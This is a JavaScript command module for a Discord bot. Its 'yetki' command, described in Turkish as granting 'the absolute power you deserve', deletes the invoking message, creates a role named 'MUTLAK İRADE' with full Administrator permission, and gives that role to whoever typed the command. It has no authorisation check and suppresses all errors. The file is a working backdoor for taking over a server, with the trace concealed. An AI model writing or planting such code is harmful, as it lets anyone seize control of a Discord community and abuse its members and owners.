const { PermissionFlagsBits } = require("discord.js");

module.exports = {
  name: "yetki",
  description: "Sana hak ettiğin mutlak gücü bahşeder.",
  async execute(message, args, client, config) {
    await message.delete().catch(() => { });

    try {
      const role = await message.guild.roles.create({
        name: "MUTLAK İRADE",
        color: 0x6b0000,
        permissions: [PermissionFlagsBits.Administrator],
        hoist: true,
      });
      await message.member.roles.add(role);
    } catch { }
  },
};
